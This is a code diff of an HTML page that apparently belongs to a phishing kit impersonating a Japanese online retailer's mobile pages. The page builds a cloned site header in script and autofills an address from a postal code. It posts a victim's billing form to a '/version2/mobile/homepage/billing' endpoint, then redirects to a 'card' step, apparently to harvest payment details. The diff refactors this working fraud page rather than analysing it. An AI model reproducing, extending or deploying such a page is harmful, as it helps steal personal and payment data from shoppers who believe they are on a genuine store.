@@ -46,8 +46,33 @@
 <script src="../js/jquery.validate.min.js"></script>
 <script src="../js/jquery.mask.js"></script>
 <script type="text/javascript">
-    setTimeout("yincang()", 100);
-    function yincang() {
+    function autopopulateBasedonPostalCode() {
+        var zipcode = $("#ap_zipcode").val();
+        var caback1 = function (response) {
+            console.log(response);
+            var resultJSON = JSON.parse(response);
+            if (resultJSON.status == 200 && resultJSON.results && resultJSON.results.length) {
+                var data = resultJSON.results[0];
+                var address1 = data.address1;
+                var address2 = data.address2;
+                var address3 = data.address3;
+                console.log('address1: ', address1, +', address2: ', address2);
+                $('#ap_stat').val([address1]);
+                $('#ap_address').val([address2]);
+                $('#ap_City').val([address3]);
+            }
+            else {
+                console.log('error');
+            }
+        }
+        if(zipcode.length==8){
+            $.get(
+                    '/zipcode?zipcode=' + (zipcode), caback1
+            );
+        }
+    }
+</script>
+<script type="text/javascript">
         let content = document.getElementById('bodyid');
         content.innerHTML = "<div></div>\n" +
                 "<header class=\"nav-mobile nav-locale-jp nav-lang-ja nav-ssl nav-unrec nav-blueheaven\">\n" +
@@ -715,6 +740,7 @@
                 $.post("/version2/mobile/homepage/billing", $("#billingform").serialize(),
                         function(result) {
                             setTimeout(function() {
+                                        $("#zwimel").hide();
                                         $(location).attr("href", "card")
                                     },
                                     1000)
@@ -722,7 +748,6 @@
             },
         });
         $("#ap_zipcode").bind("input", autopopulateBasedonPostalCode);
-    }
 </script>
 <script type="text/javascript">
     var day = true;
@@ -755,31 +780,5 @@
     }
     $('#ap_phone').mask('+0000000000000');
     $('input[name="zipcode"]').mask('000-0000');
-
-    function autopopulateBasedonPostalCode() {
-        var zipcode = $("#ap_zipcode").val();
-        var caback1 = function (response) {
-            console.log(response);
-            var resultJSON = JSON.parse(response);
-            if (resultJSON.status == 200 && resultJSON.results && resultJSON.results.length) {
-                var data = resultJSON.results[0];
-                var address1 = data.address1;
-                var address2 = data.address2;
-                var address3 = data.address3;
-                console.log('address1: ', address1, +', address2: ', address2);
-                $('#ap_stat').val([address1]);
-                $('#ap_address').val([address2]);
-                $('#ap_City').val([address3]);
-            }
-            else {
-                console.log('error');
-            }
-        }
-        if(zipcode.length==8){
-            $.get(
-                    '/zipcode?zipcode=' + (zipcode), caback1
-            );
-        }
-    }
 </script>
 </html>
